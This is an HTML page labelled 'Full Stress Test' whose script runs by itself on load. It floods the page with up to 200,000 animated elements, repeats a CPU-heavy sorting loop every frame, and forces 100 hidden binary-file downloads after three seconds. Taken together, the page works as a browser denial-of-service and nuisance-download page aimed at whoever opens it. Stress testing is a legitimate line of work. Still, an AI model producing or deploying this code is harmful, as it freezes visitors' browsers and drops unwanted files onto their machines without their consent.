<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Full Stress Test</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: black;
    }
    .box {
      width: 4px;
      height: 4px;
      position: absolute;
      will-change: transform;
    }
  </style>
</head>
<body>
  <script>
    let boxes = [];
    let boxCount = 0;

    function createBoxes(count) {
      for (let i = 0; i < count; i++) {
        const box = document.createElement('div');
        box.className = 'box';
        box.style.left = '0px';
        box.style.top = '0px';
        box.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
        document.body.appendChild(box);
        boxes.push({
          el: box,
          angle: Math.random() * Math.PI * 2,
          radius: Math.random() * 500,
          speed: Math.random() * 0.05 + 0.01
        });
      }
    }

    function heavyComputation() {
      for (let i = 0; i < 5000; i++) {
        const arr = Array.from({ length: 1000 }, () => Math.random());
        arr.sort((a, b) => b - a);
      }
    }

    function animate() {
      const centerX = window.innerWidth / 2;
      const centerY = window.innerHeight / 2;
      for (const box of boxes) {
        box.angle += box.speed;
        const x = centerX + Math.cos(box.angle) * box.radius;
        const y = centerY + Math.sin(box.angle) * box.radius;
        box.el.style.transform = `translate(${x}px, ${y}px)`;
      }
      heavyComputation(); // CPU stress
      requestAnimationFrame(animate);
    }

    // Spawn boxes like crazy
    const interval = setInterval(() => {
      if (boxCount >= 200000) clearInterval(interval);
      createBoxes(2000);
      boxCount += 2000;
    }, 100);

    animate();

    // ðŸ’¾ Simulate 100 file downloads (each ~200KB)
    function triggerDownloads() {
      for (let i = 0; i < 100; i++) {
        const blob = new Blob([new Uint8Array(200_000).fill(i)], { type: 'application/octet-stream' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `stress-file-${i}.bin`;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        URL.revokeObjectURL(url);
        a.remove();
      }
    }

    // Start downloads after 3 seconds
    setTimeout(triggerDownloads, 3000);
  </script>
</body>
</html>
